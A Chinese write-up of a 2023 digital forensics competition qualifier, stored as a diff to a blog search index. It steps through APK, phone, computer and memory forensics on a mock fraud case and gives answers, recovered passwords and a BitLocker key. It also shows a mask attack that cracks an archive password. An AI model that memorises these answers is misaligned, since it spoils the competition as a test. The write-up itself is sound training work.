@@ -1,6 +1,529 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2023第一届盘古石晋级赛</title>
+    <url>/posts/83fd5333.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以赛代练，以赛促学。唯有参赛，才知道菜。</p>
+<blockquote>
+<p>容器密码：usy1UN2Mmgram&amp;^d?0E5r9myrk!cmJGr</p>
+</blockquote>
+<h1 id="Android-APK部分"><a href="#Android-APK部分" class="headerlink" title="Android APK部分"></a>Android APK部分</h1><p>1、涉案应用刷刷樂的签名序列号是[★☆☆☆☆]</p>
+<p>我直接用雷电APP分析查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">详细信息——&gt;有效签名APK1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：11fcf899</p>
+</blockquote>
+<p>2、涉案应用刷刷樂是否包含读取短信权限答案：是/否[★★☆☆☆]</p>
+<table>
+<thead>
+<tr>
+<th>级别（危险）</th>
+<th align="left">读取电话状态android.permission.READ_PHONE_STATE</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>级别（正常）</strong></td>
+<td align="left">查看网络连接android.permission.ACCESS_NETWORK_STATE</td>
+<td>查看Wi-Fi连接android.permission.ACCESS_WIFI_STATE</td>
+</tr>
+<tr>
+<td></td>
+<td align="left">连接和断开Wi-F<br />iandroid.permission.CHANGE_WIFI_STATE</td>
+<td>安卓前台服务android.permission.FOREGROUND_SERVICE</td>
+</tr>
+<tr>
+<td></td>
+<td align="left">完全网络访问<br />android.permission.INTERNET</td>
+<td>请求安装应用android.permission.REQUEST_INSTALL_PACKAGES</td>
+</tr>
+<tr>
+<td></td>
+<td align="left">控制振动android.permission.VIBRATE</td>
+<td>修改或删除SD卡中的内容android.permission.WRITE_EXTERNAL_STORAGE</td>
+</tr>
+<tr>
+<td></td>
+<td align="left">android.permission.WAKE_LOCK</td>
+<td>修改华为桌面设置com.huawei.android.launcher.permission.CHANGE_BADGE</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>答案：否</p>
+</blockquote>
+<p>3、涉案应用刷刷樂打包封装的调证ID值是[答案：123ca12a] [★★☆☆☆]</p>
+<p>雷电app智能分析第三方服务中，查看调度值</p>
+<blockquote>
+<p>答案：a6021386163125</p>
+</blockquote>
+<p>4、涉案应用刷刷樂服务器地址域名是[答案：axa.baidun.com] [★★★☆☆]</p>
+<p>在源码中的index.html中可以找到服务器地址域名</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">api.openFrame(&#123;</span><br><span class="line">            name: <span class="string">&#x27;main&#x27;</span>,</span><br><span class="line">            url: <span class="string">&#x27;http://vip.shuadan.com:8084&#x27;</span>,</span><br><span class="line">            bounces: <span class="literal">false</span>,</span><br><span class="line">            rect: &#123;</span><br><span class="line">                w: <span class="string">&#x27;auto&#x27;</span>,</span><br><span class="line">                h: <span class="string">&#x27;auto&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            progress:&#123;</span><br><span class="line">                type:<span class="string">&#x27;page&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：<a href="http://vip.shuadan.com:8084/">http://vip.shuadan.com:8084</a></p>
+</blockquote>
+<p>5、涉案应用刷刷樂是否存在录音行为[答案：是/否] [★★★☆☆]</p>
+<p>搜索关键词：在反编译后的源代码中搜索关键词，如”record audio”、”audio recording”、”MediaRecorder”等。这些关键词通常与录音功能相关联。</p>
+<p>在jadx中可以在<code>com.uzmap.pkg.a.b.e</code>搜索到录音相关功能</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.media.MediaRecorder;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：是</p>
+</blockquote>
+<p>6、涉案应用未来资产的包名是[答案：axa.baidun.com] [★☆☆☆☆]</p>
+<p>任意检查APK软件都可以看</p>
+<blockquote>
+<p>答案： plus.H5CE4B30D</p>
+</blockquote>
+<p>7、涉案应用未来资产的语音识别服务的调证key值是[答案：1ca2jc] [★★☆☆☆]</p>
+<p>在可以查看AndroidManifest.xml</p>
+<p>科大讯飞股份有限公司</p>
+<p>讯飞开放平台：IFLY_APPKEY：53feacdd</p>
+<blockquote>
+<p>答案：53feacdd</p>
+</blockquote>
+<p>8、涉案应用未来资产的服务器地址域名是[答案：axa.baidun.com] [★★★☆☆]</p>
+<p>使用雷电APP智能分析</p>
+<blockquote>
+<p>答案：<a href="http://vip.usdtre.club:8085/">http://vip.usdtre.club:8085/</a></p>
+</blockquote>
+<p>9、涉案应用未来资产的打包封装的调证ID值是是[答案：axa.baidun.com] [★★☆☆☆]</p>
+<p>直接查看打包服务商</p>
+<blockquote>
+<p>答案：H5CE4B30D</p>
+</blockquote>
+<h1 id="手机取证部分"><a href="#手机取证部分" class="headerlink" title="手机取证部分"></a>手机取证部分</h1><p>1、根据容恨寒的安卓手机分析，手机的蓝牙物理地址是[答案：B9:8B:35:8B:03:52] [★☆☆☆☆]</p>
+<p>手机取证系统直接看</p>
+<blockquote>
+<p>答案：A9:8B:34:8B:04:50</p>
+</blockquote>
+<p>2、根据容恨寒的安卓手机分析，SIM卡的ICCID是[答案：80891103212348510720] [★☆☆☆☆]</p>
+<p>手机取证系统直接看</p>
+<blockquote>
+<p>答案：89014103211118510720</p>
+</blockquote>
+<p>3、根据容恨寒的安卓手机分析，团队内部沟通的聊天工具程序名称是[答案：微信] [★☆☆☆☆]</p>
+<p>根据后面的题目，再数据库查找信息时确定的</p>
+<blockquote>
+<p>答案：Potato</p>
+</blockquote>
+<p>4、根据容恨寒的安卓手机分析，团队内部沟通容恨寒收到的最后一条聊天信息内容是[答案：好的] [★★★☆☆]</p>
+<p>首先找到包名为com.qim.imm的文件夹，文件夹下有数据库文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/data/data/com.qim.imm/databases/im_db_225_18969939616_8AF2C81F-58C2-8459-C492-9C4F65E6BC1E.db</span><br></pre></td></tr></table></figure>
+
+<p>我的需要从本地文件中导出使用，挂载起手机取证分析系统后，导出就没有这个目录</p>
+<p>之后用SQL数据库软件导入表</p>
+<p>使用语句直接查询</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TONAME,<span class="type">DATE</span>,BODY <span class="keyword">FROM</span> &quot;BAProvider$j&quot; <span class="keyword">WHERE</span> TONAME<span class="operator">=</span><span class="string">&#x27;容恨寒&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="type">DATE</span> <span class="keyword">DESC</span> LIMIT <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>得到BODY</p>
+<table>
+<thead>
+<tr>
+<th>DATE</th>
+<th>BODY</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1681302605884863</td>
+<td>PEJURj48Rm9udCBuYW1lPSJNaWNyb3NvZnQgWWFIZWkiIHNpemU9IjEwIiBmbGFncz0iMSIgLz48VGV4dD7lkI7pnaLlho3nu5nkvaDku6zmkJ48L1RleHQ+PC9CVEY+</td>
+</tr>
+</tbody></table>
+<p>BODY解密后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;BTF&gt;&lt;Font name=&quot;Microsoft YaHei&quot; size=&quot;10&quot; flags=&quot;1&quot; /&gt;&lt;Text&gt;后面再给你们搞&lt;/Text&gt;&lt;/BTF&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：后面再给你们搞</p>
+</blockquote>
+<p>5、根据容恨寒的安卓手机分析，收到的刷单.rar的MD5值是[答案：202cb962ac59075b964b07152d234b70] [★★☆☆☆]</p>
+<blockquote>
+<p>答案：dc52d8225fd328c592841cb1c3cd1761</p>
+</blockquote>
+<p>6、根据容恨寒的安卓手机分析，收到的刷单.rar的解压密码是[答案：abcdg@1234@hd] [★★★☆☆]</p>
+<p>在表中BAProvider$h</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">密码规则：</span><br><span class="line">前五位：wlzhg</span><br><span class="line">末尾两位：片区简写“xn”</span><br><span class="line">中间四位：0-9随机数组合</span><br><span class="line">各部分用@连接</span><br><span class="line">示例：wlzhg@8888@xn</span><br></pre></td></tr></table></figure>
+
+<p>使用Passware Kit Forensic进行掩码爆破</p>
+<p>自定义设置</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">字符长：13 to 13</span><br><span class="line">语言：English</span><br><span class="line">已知部分密码：wlzhg@*@xn</span><br><span class="line">选择：Number</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：wlzhg@3903@xn</p>
+</blockquote>
+<p>7、根据容恨寒的安卓手机分析，发送刷单.rar的用户的手机号是[答案：15137321234] [★★★★☆]</p>
+<p>将BAProbider$j与BAProbider$b数据进行base64解密</p>
+<p>在id为860C8E3C-3CA5-42C3-94B2-B5ECDF3B3FA1的一行上可以发现是发送了刷单.rar</p>
+<p>从而确定了用户为<code>德彦慧</code></p>
+<p>解密脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">base64_string</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(base64_string).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取Excel文件</span></span><br><span class="line">wb = openpyxl.load_workbook(<span class="string">&#x27;.xlsx&#x27;</span>)</span><br><span class="line">sheet = wb.active</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建新的工作簿</span></span><br><span class="line">new_wb = openpyxl.Workbook()</span><br><span class="line">new_sheet = new_wb.active</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历每个单元格</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> sheet.iter_rows(values_only=<span class="literal">True</span>):</span><br><span class="line">    new_row = []</span><br><span class="line">    <span class="keyword">for</span> idx, cell <span class="keyword">in</span> <span class="built_in">enumerate</span>(row):</span><br><span class="line">        <span class="comment"># 根据你需要解密的列数，如果是第八列（列索引为7）且单元格的数据是字符串</span></span><br><span class="line">        <span class="keyword">if</span> idx == <span class="number">2</span> <span class="keyword">and</span> <span class="built_in">isinstance</span>(cell, <span class="built_in">str</span>):</span><br><span class="line">            decoded_data = decode_base64(cell)</span><br><span class="line">            new_row.append(decoded_data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_row.append(cell)</span><br><span class="line">    </span><br><span class="line">    new_sheet.append(new_row)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存新的Excel文件</span></span><br><span class="line">new_wb.save(<span class="string">&#x27;.xlsx&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：15137326185</p>
+</blockquote>
+<p>8、根据容恨寒的安卓手机分析，发送多个报表的用户来自哪个部门[答案：理财部] [★★★★★]</p>
+<p>可以找到一个有相关部门的表。</p>
+<p>其实根据案件解析就知道有一名技术人员，估计属于技术部。</p>
+<p>正常做法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据将BAProbider$j与BAProbider$b数据进行关联，可以得到文件都是臧觅风发的</span><br><span class="line"></span><br><span class="line">在表o可以得到风的id为229，表k中技术部的id为109</span><br><span class="line"></span><br><span class="line">在表m中可以得知与109相关联的有228、229、230</span><br></pre></td></tr></table></figure>
+
+<p>所以风是来自技术部的</p>
+<blockquote>
+<p>答案：技术部</p>
+</blockquote>
+<p>9、根据容恨寒的安卓手机分析，MAC的开机密码是[答案：asdcz] [★☆☆☆☆]</p>
+<p>手机备忘录记事本</p>
+<blockquote>
+<p>答案：apple</p>
+</blockquote>
+<p>10、根据容恨寒的安卓手机分析，苹果手机的备份密码前4位是[答案：1234] [★☆☆☆☆]</p>
+<p>手机备忘录记事本</p>
+<blockquote>
+<p>答案：1976</p>
+</blockquote>
+<p>11、根据魏文茵苹果手机分析，IMEI号是？[答案格式:239471000325479] [★☆☆☆☆]</p>
+<p>设备信息</p>
+<blockquote>
+<p>答案：358360063200634</p>
+</blockquote>
+<p>12、根据魏文茵苹果手机分析，可能使用过的电话号码不包括？[答案格式:A] [★☆☆☆☆]</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A、18043618705</span><br><span class="line">B、19212175391</span><br><span class="line">C、19212159177</span><br><span class="line">D、18200532661</span><br></pre></td></tr></table></figure>
+
+<p>只有D没有搜索到</p>
+<blockquote>
+<p>答案：D</p>
+</blockquote>
+<p>13、根据臧觅风的安卓手机分析，微信ID是[答案：wxid_av7b3jbaaht123] [★☆☆☆☆]</p>
+<p>查看通讯工具微信，账号信息</p>
+<blockquote>
+<p>答案：wxid_kr7b3jbooht322</p>
+</blockquote>
+<p>14、根据臧觅风的安卓手机分析，在哪里使用过交友软件[答案：杭州] [★★★☆☆]</p>
+<p>就只有交友软件探探中给了地址西安，其他的没有</p>
+<blockquote>
+<p>答案：西安</p>
+</blockquote>
+<p>15、根据臧觅风的安卓手机分析，嫌疑人从哪个用户购买的源码，请给出出售源码方的账号[答案：1234524229] [★☆☆☆☆]</p>
+<p>在Telegram中发现</p>
+<p>在与ming chen的聊天记录中可以发现，就是在他这里购买的源码</p>
+<p>查看好友ming chen的信息</p>
+<blockquote>
+<p>答案：5768224669</p>
+</blockquote>
+<p>16、根据臧觅风的安卓手机分析，购买源码花了多少BTC？[答案：1.21] [★☆☆☆☆]</p>
+<p>与ming chen聊天记录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ming chen</span><br><span class="line">0.2BT</span><br><span class="line">后来讲价为</span><br><span class="line">0.08</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：0.08</p>
+</blockquote>
+<p>17、根据臧觅风的安卓手机分析，接收源码的邮箱是[答案：<a href="mailto:&#97;&#115;&#100;&#97;&#115;&#100;&#x36;&#54;&#54;&#x40;&#x68;&#x6f;&#116;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#111;&#109;">&#97;&#115;&#100;&#97;&#115;&#100;&#x36;&#54;&#54;&#x40;&#x68;&#x6f;&#116;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#111;&#109;</a>] [★☆☆☆☆]</p>
+<p>还是聊天记录</p>
+<blockquote>
+<p>答案：<a href="mailto:&#109;&#x6f;&#x6c;&#105;&#x68;&#x75;&#x61;&#x63;&#104;&#x61;&#48;&#48;&#x37;&#64;&#104;&#x6f;&#116;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#109;&#x6f;&#x6c;&#105;&#x68;&#x75;&#x61;&#x63;&#104;&#x61;&#48;&#48;&#x37;&#64;&#104;&#x6f;&#116;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;</a></p>
+</blockquote>
+<p>18、嫌疑人容恨寒苹果手机的IMEI是?[★★☆☆☆]</p>
+<p>直接查看备份文件中的info.plist文件，检索IMEI</p>
+<blockquote>
+<p>答案：353271073008914</p>
+</blockquote>
+<p>19、嫌疑人容恨寒苹果手机最后备份时间是?[答案格式:2000-01-01 13:36:25] [★★☆☆☆]</p>
+<p>在info文件中，存在值Last Backup Date，将值取出加上8就是答案</p>
+<blockquote>
+<p>答案：2023-04-12 21:20:59</p>
+</blockquote>
+<p>20、嫌疑人容恨寒苹果手机“易信”的唯一标识符（UUID）？[★★★★☆]</p>
+<p>直接去软件数据保存的地方找，一般以包名为命名的文件夹中包含许多相关信息，比如数据库，标识文件等</p>
+<p>在手机文件中找到/AppDomain-com.yixin.yixin/Documents/login_device_id_v1</p>
+<p>打开就看到</p>
+<blockquote>
+<p>答案：ec677dda-3387-4337-9b44-f7daae4fb29c</p>
+</blockquote>
+<p>21、嫌疑人容恨寒苹果手机微信ID是?[★☆☆☆☆]</p>
+<p>取证分析后直接查看微信账号信息</p>
+<blockquote>
+<p>答案：wxid_peshwv0rosih12</p>
+</blockquote>
+<h1 id="计算机部分"><a href="#计算机部分" class="headerlink" title="计算机部分"></a>计算机部分</h1><h2 id="魏文茵"><a href="#魏文茵" class="headerlink" title="魏文茵"></a>魏文茵</h2><p>1、嫌疑人魏文茵计算机的操作系统版本?[答案格式:Windows 7 Ultimate 8603] [★☆☆☆☆]</p>
+<p>火眼取证分析，操作系统信息中注意操作系统版本和当前Build版本号</p>
+<blockquote>
+<p>答案：Windows 10 Pro  Professional 14393</p>
+</blockquote>
+<p>2、嫌疑人魏文茵计算机默认的浏览器是?[答案格式:A] [★☆☆☆☆]</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A、Edge</span><br><span class="line">B、Internet Explorer</span><br><span class="line">C、Google Chrome</span><br><span class="line">D、360浏览器</span><br></pre></td></tr></table></figure>
+
+<p>仿真查看默认软件</p>
+<blockquote>
+<p>答案：C</p>
+</blockquote>
+<p>3、嫌疑人魏文茵计算机中以下那个文档不是嫌疑人最近打开过的文档?[答案格式:A] [★☆☆☆☆]</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A、掠夺攻略.docx</span><br><span class="line">B、工资表.xlsx</span><br><span class="line">C、刷单秘籍.docx</span><br><span class="line">D、脚本.docx</span><br></pre></td></tr></table></figure>
+
+<p>用户痕迹–查看最近访问的office文档</p>
+<blockquote>
+<p>答案：A</p>
+</blockquote>
+<p>4、嫌疑人魏文茵计算机中存在几个加密分区?[答案格式:3个] [★★☆☆☆]</p>
+<p>火眼取证软件启动是可以发现D，取证大师显示是E，但是都是只有一个被Bitlocker密钥加密了</p>
+<blockquote>
+<p>答案：1个</p>
+</blockquote>
+<p>5、嫌疑人魏文茵计算机中安装了哪个第三方加密容器?[答案格式:VeraCrypt] [★☆☆☆☆]</p>
+<p>仿真系统就可以看到</p>
+<blockquote>
+<p>答案：TrueCrypt</p>
+</blockquote>
+<p>6、接上题，嫌疑人魏文茵计算机中加密容器加密后的容器文件路径？[答案格式:C:\xxx\xxx] [★★☆☆☆]</p>
+<p>在取证大师中的文件分析中，加密文件中存在两个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MicroMsg.db</span><br><span class="line">名称：《穿越六十年代小知青》作者：平淡生活.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：D：\Users\WH\Documents\</p>
+</blockquote>
+<p>7、嫌疑人魏文茵计算机中磁盘分区BitLocker加密恢复秘钥为?[答案格式: 000000-000000-000000-000000-000000-000000-000000-000000] [★★★☆☆]</p>
+<p>首先对D盘进行卷影分析，在分析出来的文件记录进行原始数据搜索</p>
+<p>关键字：恢复密钥</p>
+<blockquote>
+<p>答案：000649-583407-395868-441210-589776-038698-479083-651618</p>
+</blockquote>
+<p>8、嫌疑人魏文茵计算机中BitLocker加密分区中“攻略.docx”文档里涉及多少种诈骗方式?[答案格式:11] [★☆☆☆☆]</p>
+<p>导出攻略.docx</p>
+<blockquote>
+<p>答案：38</p>
+</blockquote>
+<p>9、投资理财团伙“华中组”目前诈骗收益大约多少?[答案格式:10万] [★★☆☆☆]</p>
+<p>125969.98</p>
+<p>从打开的office文件中查看银行存款日记账</p>
+<blockquote>
+<p>答案：12万</p>
+</blockquote>
+<p>10.通过对嫌疑人魏文茵计算机内存分析，print.exe的PID是？[答案格式:123] [★★☆☆☆]</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f memdump.mem --profile=Win10x64_10586 pslist | grep <span class="built_in">print</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>答案：728</p>
+</blockquote>
+<h2 id="臧觅风"><a href="#臧觅风" class="headerlink" title="臧觅风"></a>臧觅风</h2><p>11.根据臧觅风的计算机分析，请给出技术人员计算机“zang.E01”的SHA-1?(答案格式:7B2DC1741AE00D7776F64064CDA321037563A769)(★☆☆☆☆)</p>
+<blockquote>
+<p>答案：813FC904ECA559B2DCFCE2802AE87E013DAAA81F</p>
+</blockquote>
+<p>12.根据臧觅风的计算机分析，请给出该技术人员计算机“zang.E01”的总扇区数？(答案格式:100,000,000)(★★☆☆☆)</p>
+<p>用x-ways打开，并加载镜像后右键属性</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">总容量: 274,877,906,944 字节 = 256 GB</span><br><span class="line">每扇区字节数: 512</span><br><span class="line">扇区统计: 536,870,912</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：536,870,912</p>
+</blockquote>
+<p>13.根据臧觅风的计算机分析，以下那个文件不是技术人员通过浏览器下载的？(答案格式:A)(★☆☆☆☆)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A.WeChatSetup.exe</span><br><span class="line">B.aDrive.exe</span><br><span class="line">C.Potato_Desktop2.37.zip</span><br><span class="line">D.BaiduNetdisk_7.27.0.5.exe</span><br></pre></td></tr></table></figure>
+
+<p>可以查看下载的目录，或者仿真计算机在浏览器中查看下载记录</p>
+<blockquote>
+<p>答案：D</p>
+</blockquote>
+<p>14.根据臧觅风的计算机分析，请给出该技术人员邮件附件“好东西.zip”解压密码？(答案格式:abc123)(★★★★★)<br>手机17题中提到了解压密码为对方邮箱，则密码为kangshifu0008</p>
+<blockquote>
+<p>答案：kangshifu0008</p>
+</blockquote>
+<p>15.根据臧觅风的计算机分析，该技术人员电脑内曾通过远程管理工具连接过服务器“master.k8s.com”,请给出连接的端口号？(答案格式:22)(★★☆☆☆)</p>
+<p>全局搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S:&quot;Hostname&quot;=master.k8s.com</span><br><span class="line">S:&quot;Username&quot;=root</span><br><span class="line">D:&quot;[SSH2] 端口&quot;=000008ea</span><br></pre></td></tr></table></figure>
+
+<p>十六进制转二进制</p>
+<blockquote>
+<p>答案：2282</p>
+</blockquote>
+<p>16.根据臧觅风的计算机分析，接上题，请给出服务器的密码？(答案格式:password(★★★★☆)</p>
+<p>在同样的文件中可以找到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Password&quot;=u9e213284b79b4970c7962291aee426959ee4384d66ad6179b9d0a08a2d5654bc</span><br></pre></td></tr></table></figure>
+
+<p>不知道什么加密</p>
+<p>但是可以找到一个叫账号信息的word，里面有记录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器账号密码：P@ssw0rd</span><br><span class="line">IM系统密码：administrator/P@ssw0rd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：P@ssw0rd</p>
+</blockquote>
+<p>17.根据臧觅风的计算机分析，据该技术人员交代，其电脑内有个保存各种密码的txt文件，请找出该文件，计算其MD5值？(答案格式:7B2DC1741AE00D7776F64064CDA321037563A769)(★★★★★)</p>
+<p>全局搜索password</p>
+<blockquote>
+<p>答案：C1934045C3348EA1BA618279AAC38C67</p>
+</blockquote>
+<p>18.根据臧觅风的计算机分析，该技术人员曾使用过加密容器反取证技术，请给出该容器挂载的盘符？(答案格式:A)(★☆☆☆☆)</p>
+<p>在仿真电脑上可以看到，存在盘符F</p>
+<blockquote>
+<p>答案：F</p>
+</blockquote>
+<p>19.根据臧觅风的计算机分析，请给出该技术人员电脑内keePass的Master Password？(答案格式:password12#)(★★★★☆)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KeePass 是一个密码管理工具，Master Password（主密码）是用于保护 KeePass 数据库的密码。Master Password 是用户自行设置的，用于加密和解密整个 KeePass 数据库文件。每次打开或访问 KeePass 数据库时，都需要提供正确的 Master Password 才能解锁数据库并获取保存在其中的密码信息。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>20.根据臧觅风的计算机分析，请给出该技术人员所使用的爬虫工具名称？(答案格式:xxx)(★★☆☆☆)</p>
+<p>仿真后在电脑桌面</p>
+<blockquote>
+<p>答案；后羿采集器</p>
+</blockquote>
+<p>21.根据臧觅风的计算机分析，接上题，该技术人员通过该采集器一共采集了多少条人员信息数据？(答案格式:xxx)(★★★★★)</p>
+<p>在坚果手机的/storage/emulated/0/Android/data/com.qim.imm/files/Potato/Attachment目录下有6个表，依次计算即可</p>
+<p>18970+17+100+13+96+29</p>
+<blockquote>
+<p>答案：19225</p>
+</blockquote>
+<p>22.根据臧觅风的计算机分析，以下那个不是该技术人员通过爬虫工具采集的数据？(答案格式:A)(★☆☆☆☆)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A.中国证券投资基金业协人员信息</span><br><span class="line">B.仓山区市场监督管理局行政执法人员信息</span><br><span class="line">C.清平镇卫生院基本公共卫生服务</span><br><span class="line">D.仓山区市场监督管理局行政执法人员信息</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：C</p>
+</blockquote>
+<p>23.根据臧觅风的计算机分析，该嫌疑人曾浏览过“阿里云WebDAV”，请给出该“阿里云WebDAV”端口号？(答案格式:2211)(★★☆☆☆)</p>
+<p>谷歌浏览器历史记录</p>
+<p>搜索WebDAV，可以得到一个网址，192.168.8.20.再过滤这个网址</p>
+<p>可以得到曾经访问过8080端口</p>
+<blockquote>
+<p>答案：8080</p>
+</blockquote>
+<p>24.根据臧觅风的计算机分析，请给出该技术人员电脑内代理软件所使用的端口号？(答案格式:2211)(★★☆☆☆)</p>
+<p>打开小猫咪，7890.</p>
+<p>一般来说默认的就是7890</p>
+<blockquote>
+<p>答案：7890</p>
+</blockquote>
+<p>25.根据臧觅风的计算机分析，接上题，请给出该代理软件内订阅链接的token？(答案格式:abc1234df334…)(★★☆☆☆)</p>
+<p>设置订阅</p>
+<blockquote>
+<p>答案：4fedf57596247dfac21b5c17aab1778e</p>
+</blockquote>
+<p>26.根据臧觅风的计算机分析，请给出该技术人员电脑内用于内部通联工具的地址和端口？(答案格式:<a href="http://www.baidu.com:1122)(★★★☆☆)">www.baidu.com:1122)(★★★☆☆)</a></p>
+<p>查看Potato</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usdterclub</span><br><span class="line">im.pgscup.com</span><br><span class="line">6661</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：im.pgscup.com:6661</p>
+</blockquote>
+<p>27.根据臧觅风的计算机分析，请给出该电脑内存镜像创建的时间（北京时间）？(答案格式:2023-05-0614:00:00)(★☆☆☆☆)</p>
+<p>使用命令：<code>vol.exe -f 1.mem imageinfo</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win10x64_14393, Win10x64_10586, Win10x64, Win2016x64_14393</span><br><span class="line">                     AS Layer1 : Win10AMD64PagedMemory (Kernel AS)</span><br><span class="line">           Image date and time : 2023-04-27 09:57:53 UTC+0000</span><br><span class="line">     Image local date and time : 2023-04-27 17:57:53 +0800</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：2023-04-27 17:57:53</p>
+</blockquote>
+<p>28.根据臧觅风的计算机分析，以下那个不是“chrone.exe”的动态链接库？(答案格式:A)(★★★★☆)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A.ntdll.dll</span><br><span class="line">B.iertutil.dll</span><br><span class="line">C.wow64cpu.dll</span><br><span class="line">D.wow64win.dll</span><br></pre></td></tr></table></figure>
+
+<p>使用命令获取进程的pid</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.exe -f 1.mem --profile=Win10x64_14393 pslist | grep chrone</span><br><span class="line"></span><br><span class="line">0xffff878e27f02080 chrone.exe             7424   3604     32        0      1      0 2023-04-27 09:47:13 UTC+0000</span><br><span class="line">0xffff878e27f85080 chrone.exe             7888   7424      8        0      1      0 2023-04-27 09:47:13 UTC+0000</span><br><span class="line">0xffff878e27464800 chrone.exe             6388   7424     15        0      1      0 2023-04-27 09:47:13 UTC+0000</span><br><span class="line">0xffff878e2530c080 chrone.exe             7720   7424     14        0      1      0 2023-04-27 09:47:13 UTC+0000</span><br><span class="line">0xffff878e27ebb080 chrone.exe             5968   7424      7        0      1      0 2023-04-27 09:47:13 UTC+0000</span><br><span class="line">0xffff878e24cc0080 chrone.exe             8376   7424     16        0      1      0 2023-04-27 09:48:00 UTC+0000</span><br><span class="line">0xffff878e25530080 chrone.exe             8696   7424     16        0      1      0 2023-04-27 09:48:10 UTC+0000</span><br><span class="line">0xffff878e2551d080 chrone.exe             6032   7424     16        0      1      0 2023-04-27 09:48:41 UTC+0000</span><br><span class="line">0xffff878e25688080 chrone.exe             7944   7424     21        0      1      0 2023-04-27 09:49:28 UTC+0000</span><br><span class="line">0xffff878e25698080 chrone.exe             8980   7424     24        0      1      0 2023-04-27 09:49:32 UTC+0000</span><br><span class="line">0xffff878e281c0080 chrone.exe             1420   7424     22        0      1      0 2023-04-27 09:49:39 UTC+0000</span><br></pre></td></tr></table></figure>
+
+<p>使用命令打印dll</p>
